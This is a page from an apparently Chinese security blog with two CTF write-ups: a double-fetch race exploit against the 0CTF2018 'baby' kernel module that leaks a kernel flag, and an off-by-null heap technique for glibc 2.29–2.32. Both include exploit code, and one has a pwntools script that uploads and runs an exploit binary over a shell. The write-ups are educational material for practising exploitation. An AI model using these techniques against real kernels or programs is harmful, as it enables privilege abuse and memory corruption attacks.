<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta property="og:type" content="website">
<meta property="og:title" content="PIG-007">
<meta property="og:url" content="http://pig-007.github.io/page/6/index.html">
<meta property="og:site_name" content="PIG-007">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="PIG-007">
<meta name="twitter:card" content="summary"><title>PIG-007</title><link ref="canonical" href="http://pig-007.github.io/page/6/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/0CTF2018-baby(double-fetch)/">0CTF2018-baby(double-fetch)</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>只给了baby.ko和加载的文件系统core.cpio，没有内核和启动脚本，所以需要下载和配置。</p>
<p>1.下载内核配置环境：</p>
<p>(1)IDA打开baby.ko查看十六进制的汇编可以看到调用的Linux版本，可以下载源码编译或者直接下载编译好的。<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-27_12-07-25.png" alt="img"></p>
<p>(2)解压得到压缩内核：</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">apt search linux-image-[version]</span><br><span class="line">apt download xxxx</span><br><span class="line">ar -x linux-image-4.15.0-22-generic_4.15.0-22.24_amd64.deb</span><br></pre></td></tr></table></div></figure>

<p>在./data/boot中有vmlinuz-4.15.0-22-generic，不要再类似压缩为bzImage，可以直接用来启动qemu。</p>
<p>(3)配置文件系统和启动脚本：</p>
<p>①文件系统：用busybox制作的，find ./* | cpio -H newc -o &gt; rootfs.cpio</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1.png" alt="1"></p>
<p>②启动脚本和配置文件：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2.png" alt="2"></p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 256M -smp 4,cores=2,threads=2 \</span><br><span class="line">-kernel ./vmlinux \</span><br><span class="line">-initrd ./rootfs.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokalsr&quot;</span> \</span><br><span class="line">-cpu qemu64 \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic \</span><br><span class="line"><span class="comment">#-gdb tcp::1234 \</span></span><br><span class="line"><span class="comment"># -S</span></span><br></pre></td></tr></table></div></figure>

<p>2.开始解析baby.ko</p>
<p>(1)两个实际命令，在baby_ioctl函数中：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs3.png" alt="3"></p>
<p>①0x6666命令可以得到flag在内核空间的地址</p>
<p>②0x1337命令会触发三个检查，如果检查成功则可以打印出flag</p>
<p>(2)漏洞点：</p>
<p>漏洞在检查上，三个检查是检查通过ioctl传入的数据rdx。</p>
<p>▲_chk_range_not_ok函数：将第一个参数rdi和第二个参数rsi相加，判断是否小于第三个参数rdx，如果大于等于将al置为1(al即rax的低8位寄存器)，如果小于则返回0，而如果要进入该if，则需要返回值为0，则需rdi+rsi &lt; rdx。</p>
<p>①检查一：_chk_range_not_ok(v2, 16LL, <em>(__readgsqword(&amp;current_task) + 4952)其中的</em>(__readgsqword(&amp;current_task) + 4952)其实是用户空间的起始地址：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs4.png" alt="4"></p>
<p>即传入数据的地址加上16需要小于0x7ffffffff000，而小于0x7ffffffff000则表示处在用户空间中：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs5.png" alt="5"></p>
<p>那么就是检查传入的数据的地址是否位于用户空间。</p>
<p>②检查二即将传入的数据作为一个结构体，检查该结构体中flag指针对应的数据的地址加上flag的长度是否位于用户空间。</p>
<p>③检查三即检查flag的长度是否和程序中硬编码的长度相等。</p>
<p>▲由于传入的结构体是由我们控制的，且过程中依据该结构体来索引flag，其中的flag指针我们也可以改变，所以如果在检查结束之后，打印flag之前，能够将flag指针指向内核空间真正的flag处，那么就能够通过：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(flag); ++i )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(*v5 + i) != flag[i] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">22LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>从而打印内核空间真正的flag了。而这个内核空间flag的地址可以通过命令0x6666得到，这样就类似于利用了一个条件竞争的漏洞。</p>
<p>3.编写exp</p>
<p>(1)首先是结构体：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">struct MyflagStruc</span><br><span class="line">&#123;</span><br><span class="line">    char *flag;</span><br><span class="line">    size_t len;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>(2)接着打开dev获取地址:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">int fd = open(&quot;/dev/baby&quot;,O_RDONLY);</span><br><span class="line">ioctl(fd,0x6666);</span><br><span class="line"></span><br><span class="line">system(&quot;dmesg &gt; /tmp/record.txt&quot;);</span><br><span class="line">allInfo_fd= open(&quot;/tmp/record.txt&quot;,O_RDONLY);</span><br><span class="line">lseek(allInfo_fd,-0x1000,SEEK_END);</span><br><span class="line">read(allInfo_fd,buf,0x1000);</span><br><span class="line">close(allInfo_fd);</span><br><span class="line">idx = strstr(buf,&quot;Your flag is at &quot;);</span><br><span class="line">if (idx == 0)&#123;</span><br><span class="line">    printf(&quot;[-]Not found addr&quot;);</span><br><span class="line">    exit(-1);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    idx += 16;</span><br><span class="line">    kernelFlag_addr = strtoull(idx,idx+16,16);</span><br><span class="line">    printf(&quot;[+]kernelFlag_addr: %p\n&quot;,kernelFlag_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>①关于dmesg，这个命令是获取从启动虚拟机开始的几乎所有的输出信息，所以如果我们打开baby这个dev，就能够得到里面printk函数的相关输出，然后把输出重定向到/tmp/record.txt这里面，再从record.txt中获取地址。同时由于是所有的输出信息，所以返回给我们的flag地址肯定是在最后面的，所以lseek(allInfo_fd,-0x1000,SEEK_END);从最后面往前获取0x1000个字节，然后再来用strstr获取子字符串索引，最后strtoull转换地址得到内核中flag的地址。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs6.png" alt="6"></p>
<p>(3)然后创建线程，爆破修改数据中flag指向的地址。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">MyflagStruc myflag;</span><br><span class="line">myflag.len = 33;</span><br><span class="line">myflag.flag = buf;</span><br><span class="line">pthread_create(&amp;myflag, NULL, change_attr_value,&amp;myflag);</span><br><span class="line">for(int i = 0; i &lt; 0x1000; i ++)&#123;</span><br><span class="line">    ret = ioctl(fd, 0x1337, &amp;myflag);</span><br><span class="line">    myflag.flag = buf;</span><br><span class="line">&#125;</span><br><span class="line">finish = 1;</span><br><span class="line">pthread_join(myflag, NULL);</span><br><span class="line">close(fd);</span><br><span class="line">puts(&quot;[+]result is :&quot;);</span><br><span class="line">system(&quot;dmesg | grep flag&quot;);</span><br></pre></td></tr></table></div></figure>

<p>线程方面这涉及回调函数相关知识，自己补吧。</p>
<p>(4)线程回调函数：修改flag指向内核的flag，从而能够通过逐字节验证</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">void changeFlagAddr(void *myflag)&#123;</span><br><span class="line">    while(finish==0)&#123;</span><br><span class="line">        myflag-&gt;flag = kernelFlag_addr ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>4.一些注意事项：</p>
<p>(1)头文件的注意事项，和写小程序一样，自己加。</p>
<p>(2)线程注意事项：gcc编译时需要加上-lpthread参数，并且要静态编译。</p>
<p>(3)输入输出重定向：我看很多exp都有关闭输入输出流的，但是我尝试了一下，不用关其实也可以，可能是对应的环境关系吧。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">setvbuf(stdin,0,2,0);</span><br><span class="line">setvbuf(stdout,0,2,0);</span><br><span class="line">setvbuf(stderr,0,2,0);</span><br></pre></td></tr></table></div></figure>

<p>(4)文件传输模块：</p>
<p>先转发一下启动程序：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">socat tcp-listen:30000,fork exec:./boot.sh,reuseaddr</span><br></pre></td></tr></table></div></figure>

<p>可以用下列脚本，这个脚本参照这位师傅的：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/104537991" >https://blog.csdn.net/seaaseesa/article/details/104537991</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line"># coding:utf8</span><br><span class="line">from pwn import *</span><br><span class="line">import base64</span><br><span class="line"> </span><br><span class="line">sh = remote(&#x27;127.0.0.1&#x27;,30000)</span><br><span class="line"> </span><br><span class="line">#exploit</span><br><span class="line">f = open(&#x27;./exp&#x27;,&#x27;rb&#x27;)</span><br><span class="line">content = f.read()</span><br><span class="line">total = len(content)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"># segment send</span><br><span class="line">per_length = 0x200;</span><br><span class="line"># touch file</span><br><span class="line">sh.sendlineafter(&#x27;$ &#x27;,&#x27;touch /tmp/exploit&#x27;)</span><br><span class="line"></span><br><span class="line">log.info(&quot;Total length:%d&quot;%total)</span><br><span class="line">for i in range(0,total,per_length):</span><br><span class="line">   bstr = base64.b64encode(content[i:i+per_length])</span><br><span class="line">   sh.sendlineafter(&#x27;$ &#x27;,&#x27;echo &#123;&#125; | base64 -d &gt;&gt; /tmp/exploit&#x27;.format(bstr))</span><br><span class="line">   print(i)</span><br><span class="line">   </span><br><span class="line">if total - i &gt; 0:</span><br><span class="line">   bstr = base64.b64encode(content[total-i:total])</span><br><span class="line">   sh.sendlineafter(&#x27;$ &#x27;,&#x27;echo &#123;&#125; | base64 -d &gt;&gt; /tmp/exploit&#x27;.format(bstr))</span><br><span class="line"> </span><br><span class="line">sh.sendlineafter(&#x27;$ &#x27;,&#x27;chmod +x /tmp/exploit&#x27;)</span><br><span class="line">sh.sendlineafter(&#x27;$ &#x27;,&#x27;/tmp/exploit&#x27;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></div></figure>

<p>(5)调试模块：</p>
<p>关于文件系统的选择方面，用精简版的Busybox开出来的qemu调试的时候获取加载模块的基地址总是出错，暂时不知道为什么后面补。</p>
<p>但是可以用2018强网杯core的文件系统，加载之后调试的基地址没问题，这个在ctfwiki上有。</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/2.29-2.32%E4%B8%8B%E7%9A%84off-by-null/">2.29-2.32下的off-by-null</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>最近发现一种对于高版本libc更好的方法，不用爆破，先贴下连接：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/236078#h3-7" >https://www.anquanke.com/post/id/236078#h3-7</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>而且这个可以说是通杀除了2.33版本的所有Libc，因为没用用到tcache和fastbin，这位大佬WJH师傅真是神仙。但是他的有些地方有点出入，刚开始调试的时候容易直接干蒙，所以这里总结一下。</p>
<p>▲总的来说是运用unsortedbin来踩地址，然后再借用unsortedbin和Largebin加上off-by-null来修复fd，bk，从而能够通过新增的检查。这里我拿</p>
<p>第三届山东新一代信息技术创新应用大赛 werewolf2，原题是2.27的，这里用2.31模拟一下。</p>
<p>这道题来举例，题目不同chunk的索引对应变化。</p>
<p>1.首先堆风水布局，让我们之后申请用来利用的chunk的后一个字节可控，就是得为0x00，方便off-by-null利用。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>-<span class="number">0x8</span>-<span class="number">0xf0</span>,<span class="string">&#x27;padd&#x27;</span>)<span class="comment">#0</span></span><br></pre></td></tr></table></div></figure>

<p>这个堆布局看具体的环境，有的题上来先申请一堆堆块，容易搞蒙，d调一下就知道了。</p>
<p>2.然后准备堆块，结合之前的堆布局，需要满足条件：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x01&#x27;</span>*<span class="number">0x410</span>) <span class="comment">#1 fd  0x---2b0</span></span><br><span class="line">add(<span class="number">0x108</span>,<span class="string">&#x27;\x02*0x100&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x03&#x27;</span>*<span class="number">0x410</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x438</span>,<span class="string">&#x27;\x04&#x27;</span>*<span class="number">0x430</span>) <span class="comment">#4 unlink_chunk  0x---c00</span></span><br><span class="line">add(<span class="number">0x108</span>,<span class="string">&#x27;\x05&#x27;</span>*<span class="number">0x100</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;\x06&#x27;</span>*<span class="number">0x420</span>) <span class="comment">#6 bk  0x---150</span></span><br><span class="line">add(<span class="number">0x208</span>,<span class="string">&#x27;\x07&#x27;</span>*<span class="number">0x200</span>) <span class="comment">#7</span></span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_22-18-35.png" alt="img"></p>
<p>其中0x108大小的堆块主要是辅助加隔离，然后0x428之类的几个不同大小是为切割unsortedbin来搞事。然后这里我申请了0x208大小的堆块，这个堆块的作用主要就是隔离和填充，然后原贴的大佬由于size位用到了\x0a，是个换行符，Pwn中一般比骄敏感，容易无法发送，所以这里我多申请0x100，让之后的size位变成\x0b，方便利用。</p>
<p>3.然后就开始搞事，首先释放这几个chunk。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></div></figure>

<p>满足如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_22-33-40.png" alt="img"></p>
<p>释放顺序需要注意，要利用unsortedbin在0x—c00这个chunk上留下0x—2b0和0x—150的地址作为fd和bk，之后再修复fd-&gt;bk和bk-&gt;fd：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_22-48-19.png" alt="img"></p>
<p>其中两个chunk合并了组成了0x—7e0这个chunk，方便切割之后修改0x—c00的size位。</p>
<p>4.之后申请chunk，从0x—7e0中申请切割，修改0x—c00的size位，同时会触发malloc_consolidate将0x—150和0x–2b0放入largebin中，这个没啥用，直接申请回来就可以了，主要是切割。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x438</span>, <span class="string">&#x27;\x08&#x27;</span>*<span class="number">0x418</span> + p64(<span class="number">0xb91</span>)) <span class="comment">#8 set size</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x09&#x27;</span>*<span class="number">0x410</span>) <span class="comment"># 9     0x---c20</span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;\x10&#x27;</span>*<span class="number">0x420</span>) <span class="comment"># 10 bk 0x---150</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x11&#x27;</span>*<span class="number">0x410</span>) <span class="comment"># 11 fd 0x---2b0</span></span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_22-42-30.png" alt="img"></p>
<p>5.之后就开始修复fd和bk，利用0x—c20和对应的fd,bk，进入unsortedbin来修复。</p>
<p>(1)修复fd:</p>
<p>先释放0x—2b0，然后释放0x—c20，利用unsortedbin来给0x—2b0的bk踩上0x—c20的地址，然后申请回来，方便之后修复bk(0x—150)，同时将踩下的地址从0x—c20修改为0x—c00，即可修复成功。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">11</span>)  <span class="comment">#0x---2b0</span></span><br><span class="line">free(<span class="number">9</span>)   <span class="comment">#0x---c20</span></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">&#x27;PIG007nb&#x27;</span>)  <span class="comment"># 12 0x---c20 to overflow \x00 in fd</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x13&#x27;</span>*<span class="number">0x410</span>) <span class="comment"># 13 0x---c20</span></span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-06-10.png" alt="img"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-03-45.png" alt="img"></p>
<p>(2)修复bk：首先进入Unsortedbin中踩地址</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-43-09.png" alt="img"></p>
<p>没啥问题 ，但是申请回来的时候有点大问题：</p>
<p>①如果先申请0x—c20，那么就会使得unsortedbin中顺序变为：</p>
<p>0x—150 -&gt; main_arena+96，导致原先的0x—150.fd被修改，无法完成修复。</p>
<p>②如果先申请0x—150，那么由于unsortedbin机制，依据fd遍历，就会先遍历到0x—c20，导致0x—c20解链放入largebin中，unsortedbin中的情况和先申请0x—c20是一样的，先变成0x—150 -&gt; main_arena+96，然后才会返回0x—150，fd都会被改。</p>
<p>▲所以先将这两个chunk放入largebin中，依据largebin的机制，由于这两个chunk的大小不同，直接申请对应大小就能得到对应的chunk，同时由于largebin排列依据从大到小，申请时也是先遍历大小再遍历fd，如果所需大小的链中只有该chunk，直接返回。所以就可以申请一个大chunk，将这两个chunk都放入largebin中，顺序为：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x9F8</span>,<span class="string">&#x27;\x14&#x27;</span>) <span class="comment"># 14 chunk into largebin</span></span><br></pre></td></tr></table></div></figure>

<p>同时这个大chunk也是之后需要触发的off-by-null的chunk</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-52-36.png" alt="img"></p>
<p>之后再申请0x—150大小的chunk就能直接得到了，现在就修复完fd和bk了。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x428</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment"># 15 partial overwrite fd</span></span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-56-22.png" alt="img"></p>
<p>6.最后用off-by-null来设置触发chunk的size位</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&#x27;\x77&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0xb90</span>))</span><br><span class="line">free(<span class="number">14</span>)</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_00-00-08.png" alt="img"></p>
<p>满足所有条件，释放</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_00-00-27.png" alt="img"></p>
<p>可以看到top_chunk已经向上合并到0x—c00了，之后就具体的具体分析就完事了。</p>
<p>▲最后贴个简单的exp，只是布局的：</p>
